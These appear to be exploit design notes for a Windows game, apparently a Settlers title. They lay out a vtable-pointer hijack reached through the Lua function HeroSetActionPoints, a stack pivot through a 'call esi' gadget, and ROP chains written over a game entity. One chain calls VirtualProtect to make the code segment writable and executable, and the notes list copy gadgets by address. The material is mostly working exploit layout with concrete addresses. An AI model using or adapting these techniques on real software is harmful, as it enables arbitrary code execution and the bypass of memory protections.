Via modified entity vtable pointer, it is possible to run an existing fragment
that has an existing pointer to it.
We use @4020E6 ("call esi"), since esi can be controlled using the lua argument2 to HeroSetActionPoints
This way, we can execute fragment @72B479h, which does not have an existing pointer to it.
This fragment pivots esp to a ROP chain written over the game entity.

Currently we use XD_Plant1 which is a CGLEEntity, so the loader is limited to 264 bytes.

alternative object sizes: 
	CGLEEntity:	264 byte
	CAnimal:	304 byte
	CBuilding:	332 byte
	CSettler:	548 byte


HeroSetActionPoints @4D9087
	mov esi, lua_arg2
	push &EventValue
	call [edx (vtable) + 40h] = call 4020E6, ret4 @4D90CB

cursor function fragment, but importantly, has "call esi" 
 and has a absolute reference to it (the value 4020E6 is already in memory)
@4020E6 
	push 7F03
	push 0
	call esi = call 72B479, ret @4020EF (do not return here)

@esi=72B479h
	xchg esp, eax
	pop edi
	ret
	
	

fake stack written over entity obj:
	402100h (fake vtable) -> edi
	40FCB5h
	eID DO NOT OVERRIDE
	58A6CFh REPLACED with original ESP!!
	...
	47179Dh jmp [eax] = jmp dword [hookBase]
	A20000h <= esp at payload run
	src
	size


actual stack:
	4020EF <- esp at this position is swapped to eax and stored 
	0
	7F03
	4D90CB <- return here to HeroSetActionPoints with ret 4




Later, we set up a secondary ROP chain on the normal stack, 
pivot to it, execute VirtualProtect, and pivot back to the original ROP chain.

Start with:
		dd 72B479h		;xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret
		
@eax:	dd dummy
		dd 40142Bh          ; pop eax ; ret
        dd virtualProtect
        dd 48A71Bh          ; call [eax] ; ret
        dd 401000h      ;D start of segment 
        dd 64B000h      ;D length
        dd 40h          ;D new access: R/W/X
        dd 856A28h      ;D dummy ptr, old permissions
		dd 40142Bh          ; pop eax ; ret
        dd esp_back
        dd 72B479h			;xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret

copy instructions:

0x0042e17f : mov dword ptr [eax + 4], ecx ; ret
0x00490654 : mov dword ptr [eax + 8], ecx ; ret
0x004848d0 : mov dword ptr [eax + 0xc], ecx ; ret
0x004961c8 : mov dword ptr [eax + 0x10], ecx ; ret
0x00484c5d : mov dword ptr [eax + 0x14], ecx ; ret
0x00484cd6 : mov dword ptr [eax + 0x18], ecx ; ret
0x0040740d : mov dword ptr [eax + 0x1c], ecx ; ret
0x0040235f : mov dword ptr [eax + 0x20], ecx ; ret
0x004b92c5 : mov dword ptr [eax + 0x24], ecx ; ret
0x004493d5 : mov dword ptr [eax + 0x28], ecx ; ret
0x004f8dde : mov dword ptr [eax + 0x2c], ecx ; ret
0x005d9d03 : mov dword ptr [eax + 0x30], ecx ; ret